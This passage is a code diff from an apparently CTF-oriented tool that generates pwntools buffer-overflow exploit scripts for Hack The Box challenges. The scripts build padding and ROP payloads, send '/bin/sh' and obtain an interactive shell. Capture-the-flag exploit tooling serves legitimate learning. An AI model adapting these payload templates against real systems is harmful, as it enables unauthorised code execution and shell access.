+            command("echo 'puts_got  = p32(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'pop_rdi   = p32(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo 'libc_addr = p32(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py")          
+                
+         command("echo 'offset     = (" + CSEC[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'padding    = \"a\" * offset' >> " + localDir + "/exploit.py")
+         command("echo 'terminater = \"\\\\n\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")         
         
-         switch = 0
-         if REG2[1] != "0x0000000000000000":
-            switch = 1           
-         if REG2[4] != "0x0000000000000000":
-            switch = 2  
-         if REG2[5] != "0x0000000000000000":
-            switch = 3         
-            
-         command("echo 'switch = " + str(switch) + "' >> " + localDir + "/exploit.py")
+# HTB EXPLOITS
          
-         command("echo '' >> " + localDir + "/exploit.py") # sPACER                    
+         if DATA[0][:3] == "reg":
+            command("echo 'payload = flat(padding,jumpto,terminater)' >> " + localDir + "/exploit.py")
+            command("echo '# print(payload)' >> " + localDir + "/exploit.py")         
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER   
          
-         command("echo 'if switch == 1:' >> " + localDir + "/exploit.py")
-         command("echo '   PAYLOAD = flat(PADDING,JUMP_64,TERMINATE)' >> " + localDir + "/exploit.py")
-         command("echo '#   print(PAYLOAD)' >> " + localDir + "/exploit.py")
+         if DATA[0][:6] == "jeeves":
+            command("echo 'payload = flat(PADDING,overwrite,terminater)' >> "  + localDir + "/exploit.py")
+            command("echo '# print(payload)' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER
          
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
+         if DATA[0][:11] == "htb-console":
+            command("echo 'payload = flat(padding,pop_rdi,custom_addr,terminater)' >> "  + localDir + "/exploit.py")
+            command("echo '# print(payload)' >> " + localDir + "/exploit.py") 
+            command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendline(\"hof\")' >> " + localDir + "/exploit.py")
+            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendline(\"/bin/sh\")' >> " + localDir + "/exploit.py")
+            command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendline(\"flag\")' >> " + localDir + "/exploit.py")
+            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")         
          
-         command("echo 'if switch == 2:' >> " + localDir + "/exploit.py")
-         command("echo '   PAYLOAD = flat(PADDING,TEST_64,TERMINATE)' >> "  + localDir + "/exploit.py")
-         command("echo '#   print(PAYLOAD)' >> " + localDir + "/exploit.py")         
+# ADD YOUR BESPOKE PAYLOAD HERE
          
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         
-         command("echo 'if switch == 3:' >> " + localDir + "/exploit.py")
-         command("echo '   PAYLOAD = flat(PADDING,POPRDI_64,CUSTOM_64,SYSTEM_64,TERMINATE)' >> "  + localDir + "/exploit.py")
-         command("echo '#   print(PAYLOAD)' >> " + localDir + "/exploit.py") 
-         command("echo '   s.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
-         command("echo '   s.sendline(\"hof\")' >> " + localDir + "/exploit.py")
-         command("echo '   s.recvuntil(\":\")' >> " + localDir + "/exploit.py")
-         command("echo '   s.sendline(\"/bin/sh\")' >> " + localDir + "/exploit.py")
-         command("echo '   s.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
-         command("echo '   s.sendline(\"flag\")' >> " + localDir + "/exploit.py")
-         command("echo '   s.recvuntil(\":\")' >> " + localDir + "/exploit.py")         
-         
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         command("echo 'if switch == 0:' >> " + localDir + "/exploit.py")
-         command("echo '   exit()' >> " + localDir + "/exploit.py")
-         command("echo 'else:' >> " + localDir + "/exploit.py")
-         command("echo '   s.send(PAYLOAD)' >> " + localDir + "/exploit.py")
+         command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
          command("echo 's.interactive()' >> " + localDir + "/exploit.py")
          command("echo 's.close()' >> " + localDir + "/exploit.py")
+         
          print(colored("[*] Python exploit template sucessfully created...", colour3))
-      DATA[11] = spacePadding("yes", COL1)
       prompt()                       
 
 # ------------------------------------------------------------------------------------- 
@@ -2004,10 +2002,13 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:  
-         os.chdir(localDir)
-         command("echo 'PWNED!!' > flag.txt")  
-         os.system("python3 exploit.py")
-         os.chdir("..")
+         if DATA[2][:6] == "static":
+            print("[-] File is curently set to static analysis...")
+         else:
+            os.chdir(localDir)
+            command("echo 'PWNED!!' > flag.txt")  
+            os.system("python3 exploit.py")
+            os.chdir("..")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
